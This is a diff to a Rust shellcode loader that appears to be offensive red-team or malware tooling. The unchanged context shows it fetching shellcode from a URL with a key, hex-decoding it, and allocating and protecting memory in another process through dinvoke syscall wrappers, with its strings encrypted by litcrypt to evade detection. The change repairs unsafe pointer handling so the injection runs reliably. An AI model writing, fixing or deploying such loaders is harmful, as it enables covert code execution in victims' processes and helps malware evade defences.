@@ -2,7 +2,7 @@
 extern crate litcrypt;
 use_litcrypt!();
 
-use std::{ffi::c_void, mem::size_of, ptr, env};
+use std::{ffi::c_void, mem::size_of, ptr, env, cell::UnsafeCell};
 use windows::Win32::{System::{Threading::{PROCESS_BASIC_INFORMATION, PEB}, WindowsProgramming::LDR_DATA_TABLE_ENTRY, Kernel::LIST_ENTRY, Diagnostics::ToolHelp::THREADENTRY32}, Foundation::HANDLE};
 use windows::Wdk::Foundation::OBJECT_ATTRIBUTES;
 use data::{PVOID, PAGE_EXECUTE_READ, PAGE_READWRITE, MEM_COMMIT, MEM_RESERVE, PROCESS_QUERY_LIMITED_INFORMATION, PROCESS_VM_READ, PROCESS_VM_WRITE, PROCESS_VM_OPERATION, PROCESS_CREATE_THREAD, PROCESS_QUERY_INFORMATION, CLIENT_ID};
@@ -179,8 +179,8 @@ fn main() {
         let zero_bits = 0 as usize;
         let sh = get_sh(&url, &key);
         let decoded_sh = hex::decode(sh).expect("");
-        let size_sh = decoded_sh.len();
-        let size: *mut usize = std::mem::transmute(&size_sh);
+        let size_sh: UnsafeCell<usize> = decoded_sh.len().into();
+        let size: *mut usize = size_sh.get();
         let ret = dinvoke::nt_allocate_virtual_memory(
             phand, 
             base_address_shellcode, 
@@ -217,8 +217,8 @@ fn main() {
 
         println!("{} 0x{:x}.",&lc!("[+] Loader written at"), base_address as isize);
 
-        let size: *mut usize = std::mem::transmute(&isize::default());
-        *size = size_sh;
+
+        let size = size_sh.get();
         let old_protection: *mut u32 = std::mem::transmute(&u32::default());
         let ret = dinvoke::nt_protect_virtual_memory(
             phand, 
